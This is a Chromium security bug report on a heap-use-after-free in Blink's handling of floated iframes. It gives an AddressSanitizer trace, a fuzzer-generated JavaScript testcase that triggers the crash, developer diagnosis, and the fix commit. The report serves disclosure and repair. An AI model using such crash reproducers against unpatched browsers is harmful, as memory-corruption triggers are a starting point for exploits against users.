# Heap-use-after-free in blink::LayoutLayerModelObject::hasSelfPaintingLayer

| Field | Value |
|-------|-------|
| **Issue ID** | [40081445](https://issues.chromium.org/issues/40081445) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | cl...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2015-02-18 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crash the latest chromium ASAN build. It requires this flag: --window-size=400,400

ASAN output:

=================================================================  

==24942==ERROR: AddressSanitizer: heap-use-after-free on address 0x60f000003060 at pc 0x7fbad9d3a13d bp 0x7fff67b50230 sp 0x7fff67b50228  

READ of size 8 at 0x60f000003060 thread T0 (chrome)  

#0 0x7fbad9d3a13c in operator blink::Layer \*WTF::OwnPtr[blink::Layer](javascript:void(0);)::\* /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/OwnPtr.h:73  

#1 0x7fbad9f7f62d in invalidatePaintForOverhangingFloats /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:2083  

#2 0x7fbad9f6312d in layoutBlockChild /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:669  

#3 0x7fbad9f70d31 in layoutBlockChildren /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:1072  

#4 0x7fbad9f5fae9 in layoutBlockFlow /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:432  

#5 0x7fbad9f5e87f in layoutBlock /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:355  

#6 0x7fbad9f199d3 in layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:1380  

#7 0x7fbad9f625b9 in layoutBlockChild /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:593  

#8 0x7fbad9f70d31 in layoutBlockChildren /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:1072  

#9 0x7fbad9f5fae9 in layoutBlockFlow /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:432  

#10 0x7fbad9f5e87f in layoutBlock /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlockFlow.cpp:355  

#11 0x7fbad9f199d3 in layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:1380  

#12 0x7fbada118103 in layoutContent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderView.cpp:139  

#13 0x7fbad945ad27 in performLayout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/FrameView.cpp:862  

#14 0x7fbad945ea4b in layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/FrameView.cpp:1020  

#15 0x7fbad9473c69 in updateLayoutAndStyleIfNeededRecursive /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/FrameView.cpp:2619  

#16 0x7fbad94734b1 in updateLayoutAndStyleForPainting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/FrameView.cpp:2582  

#17 0x7fbad9794843 in updateLayoutAndStyleForPainting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/page/PageAnimator.cpp:105  

#18 0x7fbad7a80c8a in layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/web/WebViewImpl.cpp:1913  

#19 0x7fbadd11a4a4 in Layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/gpu/render\_widget\_compositor.cc:787  

#20 0x7fbad66c380d in BeginMainFrame /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../cc/trees/thread\_proxy.cc:781  

#21 0x7fbad66cbc84 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:176  

#22 0x7fbad66cb99b in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:343  

#23 0x7fbad4af75d4 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#24 0x7fbadcf354a8 in ProcessTaskFromWorkQueue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/scheduler/task\_queue\_manager.cc:416  

#25 0x7fbad4af75d4 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#26 0x7fbad4a0e92c in RunTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:448  

#27 0x7fbad4a0f8e7 in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:458  

#28 0x7fbad4a15d4e in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#29 0x7fbad4a41558 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/run\_loop.cc:55  

#30 0x7fbad4a0d146 in base::MessageLoop::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:307  

#31 0x7fbadcf1eed2 in RendererMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/renderer\_main.cc:219  

#32 0x7fbad48f0285 in RunZygote /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:309  

#33 0x7fbad48f22c6 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:763  

#34 0x7fbad48ef8b8 in ContentMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main.cc:19  

#35 0x7fbad3a410f1 in ChromeMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../chrome/app/chrome\_main.cc:66  

#36 0x7fbac9741ec4 in \_\_libc\_start\_main /build/buildd/eglibc-2.19/csu/libc-start.c:287

0x60f000003060 is located 80 bytes inside of 168-byte region [0x60f000003010,0x60f0000030b8)  

freed by thread T0 (chrome) here:  

#0 0x7fbad3a22ad9 in \_\_interceptor\_free ??:?  

#1 0x7fbad8757629 in detach /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:931  

#2 0x7fbad8612ea4 in detach /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:831  

#3 0x7fbad86eafaf in detach /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1490  

#4 0x7fbad87572ef in reattach /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:891  

#5 0x7fbad86ee0e8 in recalcOwnStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1647  

#6 0x7fbad86ed343 in recalcStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1593  

#7 0x7fbad86197fc in recalcChildStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1257  

#8 0x7fbad86ed5ce in recalcStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1608  

#9 0x7fbad86197fc in recalcChildStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1257  

#10 0x7fbad86ed5ce in recalcStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1608  

#11 0x7fbad86635e1 in updateStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1827  

#12 0x7fbad8661ff0 in updateRenderTree /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1769  

#13 0x7fbad86645f3 in updateRenderTreeIfNeeded /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.h:471  

#14 0x7fbad8664f01 in updateLayoutIgnorePendingStylesheets /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1946  

#15 0x7fbad86da227 in clientWidth /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:583  

#16 0x7fbada6263ba in clientWidthAttributeGetter /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Element.cpp:326  

#17 0x7fbad768aa58 in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:87  

#18 0x7fbad7227d99 in GetPropertyWithAccessor /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/objects.cc:310  

#19 0x7fbad711c8bd in Load /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/ic/ic.cc:756  

#20 0x7fbad71329c4 in \_\_RT\_impl\_LoadIC\_Miss /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/ic/ic.cc:2346 (discriminator 1)  

#21 0x7fba9a407f9a (<unknown module>)  

#22 0x7fba9a4610f4 (<unknown module>)  

#23 0x7fba9a460f3d (<unknown module>)  

#24 0x7fba9a42dfbf (<unknown module>)  

#25 0x7fba9a416810 (<unknown module>)  

#21 0x7fbad6cf3ce2 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:128  

#22 0x7fbad6b02dbc in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:1512  

#23 0x7fbada4f5df3 in runCompiledScript /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:402  

#24 0x7fbada44d7f5 in executeScriptAndReturnValue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:185 (discriminator 3)

previously allocated by thread T0 (chrome) here:  

#0 0x7fbad3a22d99 in \_\_interceptor\_malloc ??:?  

#1 0x7fbad9d3f8aa in partitionAlloc /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/PartitionAlloc.h:477  

#2 0x7fbae0f2793d in blink::HTMLIFrameElement::createRenderer(blink::LayoutStyle const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/HTMLIFrameElement.cpp:117  

#3 0x7fbad87cdfcf in createRenderer /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/RenderTreeBuilder.cpp:120  

#4 0x7fbad86e9a9b in createRendererIfNeeded /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/RenderTreeBuilder.h:85  

#5 0x7fbae0f1c219 in attach /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/HTMLFrameElementBase.cpp:160  

#6 0x7fbad8757327 in reattach /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:892  

#7 0x7fbad86ede17 in recalcOwnStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1647  

#8 0x7fbad86ed343 in recalcStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1593  

#9 0x7fbad86197fc in recalcChildStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1257  

#10 0x7fbad86ed5ce in recalcStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1608  

#11 0x7fbad86197fc in recalcChildStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1257  

#12 0x7fbad86ed5ce in recalcStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1608  

#13 0x7fbad86635e1 in updateStyle /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1827  

#14 0x7fbad8661ff0 in updateRenderTree /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1769  

#15 0x7fbad9473b9d in updateRenderTreeIfNeeded /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.h:471  

#16 0x7fbad94734b1 in updateLayoutAndStyleForPainting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/FrameView.cpp:2582  

#17 0x7fbad9794843 in updateLayoutAndStyleForPainting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/page/PageAnimator.cpp:105  

#18 0x7fbad7a80c8a in layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/web/WebViewImpl.cpp:1913  

#19 0x7fbadd11a4a4 in Layout /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/gpu/render\_widget\_compositor.cc:787  

#20 0x7fbad66c380d in BeginMainFrame /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../cc/trees/thread\_proxy.cc:781  

#21 0x7fbad66cbc84 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:176  

#22 0x7fbad66cb99b in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/bind\_internal.h:343  

#23 0x7fbad4af75d4 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#24 0x7fbadcf354a8 in ProcessTaskFromWorkQueue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/scheduler/task\_queue\_manager.cc:416  

#25 0x7fbad4af75d4 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#26 0x7fbad4a0e92c in RunTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:448  

#27 0x7fbad4a0f8e7 in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:458  

#28 0x7fbad4a15d4e in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#29 0x7fbad4a41558 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/run\_loop.cc:55

SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ??  

Shadow bytes around the buggy address:  

0x0c1e7fff85b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa  

0x0c1e7fff85c0: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00  

0x0c1e7fff85d0: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa  

0x0c1e7fff85e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1e7fff85f0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa  

=>0x0c1e7fff8600: fa fa fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd  

0x0c1e7fff8610: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa  

0x0c1e7fff8620: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1e7fff8630: fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00  

0x0c1e7fff8640: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1e7fff8650: 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==24942==ABORTING

**VERSION**  

Chrome Version: asan-linux-release-316591  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o0=document.createElement('iframe');
document.body.appendChild(o0);
o0.style.cssFloat='right';
document.documentElement.style.padding='913917816% 3vmin 0vmax';
o357=document.createElement('div');
o357.style.webkitWritingMode='horizontal-tb';
document.documentElement.appendChild(o357);
window.setTimeout("cb\_dyniframes\_330\_1();",30);
}
function cb\_dyniframes\_330\_1() {
document.body.style.webkitWritingMode='vertical-rl';
o0.style.all='unset';
document.documentElement.clientWidth;
o0.style.webkitMarginAfter='22vmin';
}
window.setTimeout("start()",100);
</script>
<body>
</body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### in...@chromium.org (2015-02-18)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-02-20)

Dan, can you please help to take a look.

### cl...@chromium.org (2015-02-22)

[Empty comment from Monorail migration]

### ds...@chromium.org (2015-02-23)

This is reproducible in both chrome and content_shell. With content_shell the flag to pass is: --content-shell-host-window-size=400x400.

This seems to work fine in a non-ASan build.

### ds...@chromium.org (2015-02-23)

It looks like, for some reason, we have a FloatingObject in the FloatingObjectSet where the renderer has been destroyed.

### ds...@chromium.org (2015-02-23)

So, we call into LayoutLayerModelObject::createLayer for the IFrame and create a layer giving us:

*LayoutIFrame 0x60f000047e90            IFRAME  0x610000044940 STYLE="float: right;"

When then call into LayoutLayerModelObject::createLayer for the IFrame again and create a layer giving us:

*LayoutIFrame 0x60f000044dd0            IFRAME  0x610000044940 STYLE="all: unset;"


Just before we crash, we have a layout tree of:

RenderView 0x613000096840               #document       0x61f000085080
  RenderBlock 0x6110001e70c0            HTML    0x60b000042eb0 STYLE="padding: 913917816% 3vmin 0vmax;"
    RenderBody 0x6110001e6f80           BODY    0x60b0000429e0 STYLE="-webkit-writing-mode: vertical-rl;"
      LayoutIFrame 0x60f000044dd0       IFRAME  0x610000044940 STYLE="color: unset; ......."
*   RenderBlock 0x6110001e39c0          DIV     0x60b00004fcf0 STYLE="-webkit-writing-mode: horizontal-tb;"

We then try to update the floatingObject->renderer for 0x60f000047e90 and crash as it has already been destroyed. So, it looks like for some reason we're missing a call to remove the iframe from the floated object list when it gets re-created. (I think).

Will try to investigate more tomorrow.

### in...@chromium.org (2015-02-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-02-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-02-24)

[Empty comment from Monorail migration]

### ro...@gmail.com (2015-02-24)

I bet this is because of:

1847 void RenderBlockFlow::markSiblingsWithFloatsForLayout(RenderBox* floatToRemove)
1848 {           
1849     if (!m_floatingObjects)
1850         return;
1851 
1852     const FloatingObjectSet& floatingObjectSet = m_floatingObjects->set();
1853     FloatingObjectSetIterator end = floatingObjectSet.end();
1854 
1855     for (LayoutObject* next = nextSibling(); next; next = next->nextSibling()) {
1856         if (!next->isRenderBlockFlow() || next->isFloatingOrOutOfFlowPositioned() || toRenderBlockFlow(next)->avoidsFloats())
1857             continue;
1858     

And I think we need to do :

1856         if (!floatToRemove && (!next->isRenderBlockFlow() || next->isFloatingOrOutOfFlowPositioned() || toRenderBlockFlow(next)->avoidsFloats()))

This is because we updated the sibling RenderBlock to be a writing-mode root which avoidsFloats() just before we unset the float and caused it to come here. Because we're trying to remove a float we need to process the sibling block even if it avoidsFloats().




### in...@chromium.org (2015-02-24)

Assuming impacts stable or Robert, do you know if this regressed recently ?

### ds...@chromium.org (2015-02-24)

That change causes the issue to go away locally.

Assigning this to robhogan@ since you seem to have a much better idea of what's going on then I do. If you can't take this over then please assign back to me and I'll see if I can get it fixed up.

### ro...@gmail.com (2015-02-24)

It doesn't look like a recent regression to me - if it is the cause must be pretty indirect. It's solution is similar to https://codereview.chromium.org/850143002 which is why I could spot it - but the reason we're failing to remove floats here has nothing to do with that code path afaict. This is all about putting an element in a second element's float lists, then putting a style on that second element that prevents it from overlapping with floats in future, and then assuming that because it has that style it can't contain a float in its lists that we're destroying.

### ro...@gmail.com (2015-02-24)

Me and my big mouth... no, that's fine. :)

### cl...@chromium.org (2015-02-24)

[Empty comment from Monorail migration]

### ro...@gmail.com (2015-02-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-02-26)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=190902

------------------------------------------------------------------
r190902 | robhogan@gmail.com | 2015-02-26T10:22:54.029585Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/block/float/overhanging-float-crashes-when-sibling-becomes-formatting-context-expected.txt?r1=190902&r2=190901&pathrev=190902
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/block/float/overhanging-float-crashes-when-sibling-becomes-formatting-context.html?r1=190902&r2=190901&pathrev=190902
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderBlockFlow.cpp?r1=190902&r2=190901&pathrev=190902

Remove a float from an element's list even if its style suggests it can't contain floats

The reason we're failing to remove floats here is because we put an element in a
second element's float lists, then put a style on that second element that prevents
it from overlapping with floats in future, and then we assume that because it has
that style it can't contain the float we're destroying in its float lists.

We avoid this mistake in markDescendantsWithFloatsForLayout() so we should avoid it
here too.

BUG=459533

Review URL: https://codereview.chromium.org/954833002
-----------------------------------------------------------------

### in...@chromium.org (2015-02-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-02-26)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ti...@google.com (2015-02-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-02-27)

[Comment Deleted]

### cl...@chromium.org (2015-02-27)

[Comment Deleted]

### in...@chromium.org (2015-02-27)

dont worry about c#21,c#22, these are just to validate if new shiny additional argument field works on the test uploads page.

### cl...@chromium.org (2015-02-27)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5677982652301312

### cl...@chromium.org (2015-02-27)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5677982652301312

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000085910
Crash State:
  blink::LayoutLayerModelObject::hasSelfPaintingLayer
  blink::RenderBlockFlow::invalidatePaintForOverhangingFloats
  blink::RenderBlockFlow::layoutBlockChild
  

Minimized Testcase (0.58 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96qP0DjtA2DdFkj2xIRnatn0PeS9WA32LjHbH7046gyIN2g7qm4EJKecW9NCXFUfljSeVmUc30N0NaF0gC8qCUQdIoH6niH_QivoWejFVbTd9OoA8yQCZjOOUOfxixi2c7rtmpFgV2rg6O-gS5zHGLf9IvBBg
<script>
function start() {
o0=document.createElement('iframe');
document.body.appendChild(o0);
o0.style.cssFloat='right';
document.documentElement.style.padding='913917816% 3vmin 0vmax';
o357=document.createElement('div');
o357.style.webkitWritingMode='horizontal-tb';
document.documentElement.appendChild(o357);
window.setTimeout("cb_dyniframes_330_1();",30);
}
function cb_dyniframes_330_1() {
document.body.style.webkitWritingMode='vertical-rl';
o0.style.all='unset';
document.documentElement.clientWidth;
o0.style.webkitMarginAfter='22vmin';
}
window.setTimeout("start()",100);
</script>





### cl...@chromium.org (2015-02-28)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5677982652301312

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000085910
Crash State:
  blink::LayoutLayerModelObject::hasSelfPaintingLayer
  blink::RenderBlockFlow::invalidatePaintForOverhangingFloats
  blink::RenderBlockFlow::layoutBlockChild
  

Unminimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv9784UQ7gNf378rCtrBl5Z9ZX2kuFAYEjaBUijVjg1fVaS0MD4bEu3md9U3JiSzLHto5RYed6z37ukdnQiDGBFyRoLE4E_8qYY-fMx0feW7HQWvgwvLAiqFb_vQDK7bKJd8HUsvHp4_ZCZk5MkeYCFc7f3Y7Ew




### ti...@google.com (2015-04-08)

Re-opening due to #25 and #26.

@inferno - did this regress or is clusterfuzz getting aggressive?

### ti...@google.com (2015-04-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-04-08)

inferno@: Uh oh! This issue is still open and hasn't been updated in the last 39 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ti...@google.com (2015-04-09)

$2,000 for this one. End of another epic panel round!

### ro...@gmail.com (2015-04-09)

These trailing reports seems suspect to me - I certainly can't recreate them. 

### mb...@chromium.org (2015-04-17)

Guessing this should probably be Fixed based on c#23 and c#31.

### ti...@google.com (2015-05-06)

[Empty comment from Monorail migration]

### ti...@google.com (2015-06-03)

Processing via our *new* e-payment system should only take a 7-10 days and the reward should be on its way to you. Thanks again for your help!

### cl...@chromium.org (2015-07-25)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/459533?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/459641]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081445)*
